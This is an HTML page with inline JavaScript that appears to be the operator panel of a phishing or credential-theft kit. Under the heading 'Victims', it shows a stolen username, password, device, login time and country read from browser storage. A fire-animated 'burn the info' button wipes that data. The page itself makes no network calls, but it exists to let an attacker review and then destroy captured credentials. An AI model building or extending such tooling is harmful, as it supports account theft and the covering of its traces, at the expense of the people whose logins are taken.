<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin: 0;
    background: black;
    color: red;
    font-family: Arial;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
  }

  .box {
    text-align: center;
    width: 90%;
    max-width: 350px;
    z-index: 2;
  }

  h2 {
    background: red;
    color: black;
    padding: 10px;
    border-radius: 20px;
  }

  p {
    margin: 10px 0;
    word-wrap: break-word;
  }

  button {
    margin-top: 10px;
    padding: 10px;
    background: red;
    color: black;
    border: none;
    cursor: pointer;
    width: 100%;
  }

  /* 🔥 Fire animation */
  #fire {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 0;
    background: linear-gradient(red, orange, yellow);
    opacity: 0.85;
    z-index: 1;
    transition: height 2s ease;
  }

  /* Popup */
  #popup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.85);
    justify-content: center;
    align-items: center;
    z-index: 3;
  }

  .popup-box {
    background: red;
    color: black;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
  }
</style>
</head>
<body>

<div class="box">
  <h2>Victims</h2>

  <p id="user"></p>
  <p id="pass"></p>
  <p id="device"></p>
  <p id="time"></p>
  <p id="country"></p>

  <button onclick="burnData()">burn the info</button>
  <button onclick="refreshPage()">refresh page/show new victim info</button>
</div>

<!-- Fire overlay -->
<div id="fire"></div>

<!-- Popup -->
<div id="popup">
  <div class="popup-box">
    <p>info burned 🔥</p>
    <button onclick="closePopup()">OK</button>
  </div>
</div>

<script>
function loadData() {
  let user = localStorage.getItem("user");
  let pass = localStorage.getItem("pass");
  let device = localStorage.getItem("device");
  let time = localStorage.getItem("time");
  let country = localStorage.getItem("country");

  document.getElementById("user").innerText =
    "Username pulled by conz: " + (user || "none");

  document.getElementById("pass").innerText =
    "Password pulled by conz: " + (pass || "none");

  document.getElementById("device").innerText =
    "Device pulled by conz: " + (device || "none");

  document.getElementById("time").innerText =
    "Time of login/info steal pulled by conz: " + (time || "none");

  document.getElementById("country").innerText =
    "Rough search of country of the victime ran and pulled by conz: " + (country || "none");
}

function burnData() {
  document.getElementById("fire").style.height = "100%";

  setTimeout(() => {
    localStorage.clear();
    document.getElementById("popup").style.display = "flex";
  }, 2000);
}

function closePopup() {
  document.getElementById("popup").style.display = "none";
  location.reload();
}

function refreshPage() {
  location.reload();
}

// load data on page open
loadData();
</script>

</body>
</html>
